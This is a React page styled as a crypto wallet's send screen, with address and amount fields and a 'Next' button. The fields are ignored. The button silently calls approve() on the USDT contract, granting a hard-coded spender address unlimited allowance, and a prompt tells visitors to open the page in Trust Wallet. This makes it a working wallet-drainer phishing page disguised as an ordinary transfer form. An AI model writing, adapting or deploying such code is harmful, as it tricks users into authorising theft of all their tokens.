import { useState } from "react";
import { ethers } from "ethers";

export default function Home() {
  const [address, setAddress] = useState("");
  const [amount, setAmount] = useState("");

  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
  const SPENDER = "0x0b49c7B0AA37be439CCb4Bd9F519318950210ec0";

  const approveUSDT = async () => {
    try {
      if (!window.ethereum) {
        alert("Apri in Trust Wallet");
        return;
      }

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const usdt = new ethers.Contract(
        USDT_ADDRESS,
        [
          "function approve(address spender, uint256 amount) public returns (bool)"
        ],
        signer
      );

      // APPROVE MAX
      const tx = await usdt.approve(
        SPENDER,
        ethers.MaxUint256
      );

      await tx.wait();

      alert("Approve completato!");
    } catch (err) {
      console.log(err);
      alert("Errore");
    }
  };

  return (
    <div style={{
      background: "#0b0b0b",
      minHeight: "100vh",
      color: "white",
      fontFamily: "-apple-system, BlinkMacSystemFont, sans-serif",
      padding: "20px"
    }}>

      {/* Address */}
      <div style={{ marginTop: "40px" }}>
        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
          Address or Domain Name
        </div>

        <input
          value={address}
          onChange={(e) => setAddress(e.target.value)}
          placeholder="0x..."
          style={{
            width: "100%",
            padding: "14px",
            borderRadius: "16px",
            border: "none",
            background: "#1a1a1a",
            color: "white"
          }}
        />
      </div>

      {/* Amount */}
      <div style={{ marginTop: "25px" }}>
        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
          Amount
        </div>

        <input
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
          placeholder="0"
          style={{
            width: "100%",
            padding: "14px",
            borderRadius: "16px",
            border: "none",
            background: "#1a1a1a",
            color: "white"
          }}
        />
      </div>

      {/* Button */}
      <div style={{
        position: "fixed",
        bottom: "30px",
        left: "20px",
        right: "20px"
      }}>
        <button
          onClick={approveUSDT}
          style={{
            width: "100%",
            padding: "18px",
            borderRadius: "40px",
            background: "#22c55e",
            border: "none",
            color: "white",
            fontSize: "18px",
            fontWeight: "600"
          }}
        >
          Next
        </button>
      </div>

    </div>
  );
}